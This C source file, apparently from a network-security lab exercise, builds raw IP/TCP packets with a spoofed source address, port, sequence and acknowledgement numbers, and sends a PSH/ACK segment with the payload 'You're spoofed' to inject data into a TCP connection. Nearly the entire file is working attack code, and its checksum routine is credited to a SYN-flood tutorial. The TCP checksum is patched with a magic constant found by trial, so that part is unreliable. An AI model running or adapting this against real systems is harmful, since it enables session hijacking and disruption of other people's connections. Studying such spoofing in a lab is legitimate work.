#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include<netinet/tcp.h>
#include<netinet/ip.h>
#include <arpa/inet.h>

#define DEST_PORT 39823 //  server port
#define SPOOFED_DEST_PORT 39820
#define PACKET_LEN 4096
/******************************************************************
Spoof a TCP SYN packet.
*******************************************************************/
unsigned short csum(unsigned short *ptr, int nbytes)
{//binarytides https://www.binarytides.com/syn-flood-dos-attack/
register long sum;
unsigned short oddbyte;
register short answer;

sum=0;
while(nbytes>1) {
sum+=*ptr++;
nbytes-=2;
}
if(nbytes==1) {
oddbyte=0;
*((u_char*)&oddbyte)=*(u_char*)ptr;
sum+=oddbyte;
}

sum = (sum>>16)+(sum & 0xffff);
sum = sum + (sum>>16);
answer=(short)~sum;

return(answer);

}

struct pseudoHeader
// Used for TCP checksum calculation
{
    unsigned int source_addr;
    unsigned int dest_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_len;

    struct tcphdr tcp;
};


int main(int argc, char *argv[]) {
if (argc!=6){
printf("give Dest ip, Src IP,  src port, Sequence number and ack number as arguments\n");
exit(0);
}
char buffer[PACKET_LEN]; //have ipheader+tcpheader+data
char srcIP[32];
char *data;
int socket_fd;
if ((socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("socket() error\n");
    } else {
        printf("socket success: %d\n", socket_fd);
    }
struct iphdr *ip = (struct iphdr *) buffer; // ipheader location
struct tcphdr *tcp = (struct tcphdr *) (buffer + sizeof(struct iphdr)); //tcpheader location

strcpy(srcIP, argv[2]); //spooofed


struct sockaddr_in dest_addr;
dest_addr.sin_family= AF_INET;
dest_addr.sin_port= htons(DEST_PORT);
dest_addr.sin_addr.s_addr=inet_addr(argv[1]);

unsigned char payload[] = "You're spoofed";
    unsigned short payloadLength = strlen(payload);

memset (buffer,0,PACKET_LEN); //zeroed buffer
data = buffer+sizeof(struct iphdr)+sizeof(struct tcphdr);
stpcpy(data, "You're spoofed");

ip->version=4;
ip->ihl=5; //len
ip->tos=0; //type of service Routine
ip->tot_len=sizeof (struct iphdr) + sizeof (struct tcphdr)+strlen(data);
ip->id=htons(54321); 
ip->frag_off=0;
ip->ttl=255;
ip->protocol = 6;
ip->check=0; //will update later
ip->saddr= inet_addr(srcIP);
ip->daddr= dest_addr.sin_addr.s_addr;

ip->check=csum ((unsigned short *) buffer, ip->tot_len); //redundant

tcp->source = htons(atoi(argv[3]));
    tcp->dest = htons(DEST_PORT);
    tcp->seq = htonl(atoi(argv[4]));
    tcp->ack_seq = htonl(atoi(argv[5]));
    tcp->doff = sizeof(struct tcphdr)/4; // num of 4 byte words (32 bit)
    tcp->fin=0;
    tcp->syn=0; 
    tcp->rst=0; 
    tcp->psh=1; //set puch flag
    tcp->ack=1; //set ack flag
    tcp->urg=0;
    tcp->window = htons(5840);// Max window size
    tcp->check = 0;   
    tcp->urg_ptr = 0;


struct pseudoHeader pseudo;
pseudo.source_addr=inet_addr(srcIP);
pseudo.dest_addr=dest_addr.sin_addr.s_addr;
pseudo.placeholder=0;
pseudo.protocol =6;
pseudo.tcp_len= htons(sizeof(struct tcphdr)+strlen(data));

memcpy(&pseudo.tcp, tcp, sizeof(struct tcphdr));


//add tcphr at the end


printf("checksum calc");
/*Was getting many errors with the checksum and tried different ways of having the psuedo buffer have tcp and data but didnt work. So I continued using the way 
* I used to calculate for the previous attacks. So after sending packets multiple times with wrong checksum, I used the actual and calculated checksum from wireshark
* and took the difference of the checksums, and I found that calculated was almost always less than 22105 (+1 sometimes) than the actual checksum */
tcp->check=csum((unsigned short *) &pseudo, sizeof(struct pseudoHeader))+22105;
printf(" DONE");

memcpy((buffer+sizeof(struct iphdr)+sizeof(struct tcphdr)),payload,payloadLength);

int one = 1;
const int *val = &one;
if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
perror("setsockopt() error");
exit(-1);
}else{
printf("setsockopt() is OK\n");
}

if(sendto(socket_fd, buffer, ip->tot_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0){
perror("sendto() error");
 exit(-1);
}else{
printf("packet sent successfully\n");
}
return 0;
}
